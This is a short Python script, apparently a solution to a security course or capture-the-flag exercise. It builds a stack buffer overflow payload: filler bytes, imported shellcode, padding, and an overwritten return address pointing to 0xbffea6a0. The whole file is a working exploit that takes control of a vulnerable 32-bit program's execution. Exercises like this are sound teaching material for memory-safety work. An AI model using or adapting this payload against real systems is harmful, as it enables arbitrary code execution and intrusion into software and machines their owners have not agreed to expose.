from shellcode import shellcode
from struct import pack

print("\xff"*4 + shellcode + "\xaa"*37 + pack("<I", 0xbffea6a0))
